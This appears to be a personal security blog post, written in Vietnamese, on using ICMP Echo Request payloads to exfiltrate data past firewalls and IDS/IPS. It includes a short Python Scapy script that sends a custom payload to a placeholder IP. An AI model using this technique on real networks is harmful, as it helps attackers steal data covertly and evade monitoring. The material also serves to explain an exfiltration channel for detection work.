---
author: "waibui"
layout: post
title:  "How to Create ICMP Packets with Payload to Exfiltrate Data"
date: 2025-04-13
comments: true
description: Cách tạo các gói ICMP với tải trọng để gửi dữ liệu ra ngoài
categories: introduce
toc: true
tags: 
- security
- python
---

# How to Create ICMP Packets with Payload to Exfiltrate Data

Trong một số tình huống, kẻ tấn công có thể lợi dụng giao thức ICMP để gửi dữ liệu ra ngoài mạng, vượt qua các tường lửa và hệ thống Phát hiện/Ngăn chặn xâm nhập (IDS/IPS). Điều này có thể được thực hiện bằng cách nhúng dữ liệu vào các gói ICMP Echo Request và Echo Reply, khiến việc phát hiện việc xâm nhập trở nên khó khăn hơn.

Các gói ICMP, thường được sử dụng cho các chẩn đoán mạng như "ping", có thể bị thao túng để mang theo các payload tùy chỉnh (dữ liệu) mà kẻ tấn công muốn gửi.

## 1. ICMP Payload Theory

- **ICMP Echo Request (Loại 8) và Echo Reply (Loại 0)** là các loại gói ICMP phổ biến, thường được sử dụng cho các yêu cầu ping. Tuy nhiên, ngoài việc kiểm tra kết nối, chúng có thể chứa một payload — dữ liệu mà kẻ tấn công muốn gửi.
  
- **Payload** đề cập đến dữ liệu được bao gồm trong gói ICMP. Dữ liệu này có thể là văn bản thuần túy, thông tin đã mã hóa hoặc thậm chí là dữ liệu bị đánh cắp.

## 2. Creating ICMP Packets with Payload

Bạn có thể tạo các gói ICMP với payload tùy chỉnh bằng cách sử dụng Python và thư viện `Scapy`. Dưới đây là ví dụ về cách tạo một gói ICMP Echo Request với payload tùy chỉnh.

Dưới đây là mã Python mô tả cách tạo và gửi một gói ICMP Echo Request chứa payload tùy chỉnh.

{% highlight python %}
from scapy.all import IP, ICMP, send

def send_icmp_payload(target_ip, message):
    # The payload is the message you want to send, can be encoded data
    payload = bytes(message, 'utf-8')

    # Create an ICMP Echo Request packet
    packet = IP(dst=target_ip) / ICMP(type=8) / payload  # type=8 is Echo Request

    # Send the packet
    print(f"Sending ICMP Echo Request with payload to {target_ip}")
    send(packet)

# Target IP and the message to be sent
target_ip = "192.168.x.x"  # Replace with the actual target IP address
message = "This is a test payload that could contain exfiltrated data."

send_icmp_payload(target_ip, message)
{% endhighlight%}

<script src="https://giscus.app/client.js"
        data-repo="waibui/waibui.github.io"
        data-repo-id="R_kgDONiHcVw"
        data-category="Announcements"
        data-category-id="DIC_kwDONiHcV84ClolG"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="bottom"
        data-theme="preferred_color_scheme"
        data-lang="vi"
        crossorigin="anonymous"
        async>
</script>